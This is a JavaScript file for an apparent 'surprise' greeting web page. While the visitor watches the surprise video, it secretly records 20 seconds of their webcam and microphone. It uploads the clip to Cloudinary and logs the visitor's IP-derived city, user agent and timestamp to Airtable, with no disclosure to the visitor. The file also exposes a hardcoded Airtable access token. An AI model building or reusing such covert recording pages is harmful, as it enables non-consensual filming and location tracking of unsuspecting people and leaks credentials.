"use strict";

// ===== CONFIG =====
const CLOUD_NAME    = "dpzzfcy84";
const UPLOAD_PRESET = "forBANIKA";

const AIRTABLE_BASE  = "appBTargpA8GtlXJ3";
const AIRTABLE_TABLE = "forBANIKA";
const AIRTABLE_TOKEN = "pat2Peju0n3CZu6nv.6fe676b0b2df9d5cae2611a0b378b21920e630dd7f46cd199e1fc02047be4c9c";
// ==================

const $ = id => document.getElementById(id);
const pages = () => document.querySelectorAll(".page");
const show = id => { pages().forEach(p=>p.classList.remove("show")); const el=$(id); if(el) el.classList.add("show"); };

const intro    = $("introVideo");
const surprise = $("surpriseVideo");
const preview  = $("camPreview");
const btn      = $("startBtn");

if(intro){
  intro.onended = ()=> show("card");
}

if(btn){
  btn.onclick = ()=>{
    show("loader");
    setTimeout(()=>{ show("surprise"); startRecording(); }, 5000);
  };
}

async function startRecording(){
  let stream;
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
  }catch(e){
    alert("Camera/Mic permission needed.");
    show("card");
    return;
  }

  // Force fullscreen surprise video to play from file (not camera)
  surprise.srcObject = null;
  surprise.src = "surprise.mp4";
  await surprise.play();

  // Tiny live camera preview (muted to avoid echo)
  if(preview){
    preview.srcObject = stream;
    preview.muted = true;
    preview.volume = 0;
    await preview.play();
  }

  // Record 20 seconds
  const recorder = new MediaRecorder(stream, { mimeType:"video/webm" });
  const chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.start();

  await new Promise(r=>setTimeout(r,20000));
  recorder.stop();

  const blob = await new Promise(r=> recorder.onstop = ()=> r(new Blob(chunks,{type:"video/webm"})));
  stream.getTracks().forEach(t=>t.stop());

  // Cleanup preview
  if(preview){
    preview.pause();
    preview.srcObject = null;
  }

  const videoUrl = await uploadToCloudinary(blob);
  const info = await collectInfo();
  await logToAirtable({ videoUrl, ...info });

  show("end");
}

async function uploadToCloudinary(blob){
  const fd = new FormData();
  fd.append("file", blob);
  fd.append("upload_preset", UPLOAD_PRESET);
  const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, { method:"POST", body:fd });
  const j = await res.json();
  return j.secure_url;
}

async function collectInfo(){
  const ua = navigator.userAgent;
  let city = "";
  try{
    const r = await fetch("https://ipapi.co/json/");
    const j = await r.json();
    city = j.city || "";
  }catch(e){}

  return {
    DeviceModel: ua,
    DeviceType: /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop",
    Browser: /Chrome/i.test(ua) ? "Chrome" : /Firefox/i.test(ua) ? "Firefox" : "Other",
    City: city,
    Time: new Date().toISOString()
  };
}

async function logToAirtable(row){
  const url = `https://api.airtable.com/v0/${AIRTABLE_BASE}/${encodeURIComponent(AIRTABLE_TABLE)}`;
  await fetch(url,{
    method:"POST",
    headers:{
      "Authorization": "Bearer " + AIRTABLE_TOKEN,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      fields:{
        VideoURL: row.videoUrl,
        DeviceModel: row.DeviceModel,
        DeviceType: row.DeviceType,
        Browser: row.Browser,
        City: row.City,
        Time: row.Time
      }
    })
  });
}
